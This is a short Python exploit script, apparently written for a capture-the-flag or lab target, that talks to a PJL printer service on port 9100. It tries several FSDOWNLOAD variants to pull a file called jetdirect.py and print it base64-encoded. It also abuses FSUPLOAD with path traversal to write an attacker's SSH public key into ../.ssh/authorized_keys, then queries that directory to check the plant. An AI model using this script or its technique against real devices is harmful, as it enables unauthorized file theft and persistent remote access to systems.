#!/usr/bin/env python3
import base64
import socket

SPECS = [
    b'@PJL FSDOWNLOAD NAME="jetdirect.py" SIZE=5119\r\n',
    b'@PJL FSDOWNLOAD NAME=jetdirect.py SIZE=5119\r\n',
    b'@PJL FSDOWNLOAD NAME="jetdirect.py"\r\nSIZE=5119\r\n',
    b'@PJL FSUPLOAD NAME=../.ssh/authorized_keys SIZE=91\r\n'
    + b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n",
    b'@PJL FSUPLOAD NAME="../.ssh/authorized_keys" SIZE=91\r\n'
    + b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n",
]


def run(payload: bytes, timeout: float = 10) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out


for i, p in enumerate(SPECS):
    r = run(p)
    print("spec", i, "len", len(r), "head", r[:80])
    if b"def " in r or b"class " in r:
        print("B64", base64.b64encode(r).decode()[:2000])
    if i >= 3:
        q = run(b'@PJL FSQUERY NAME="../.ssh"\r\n')
        print("q", q)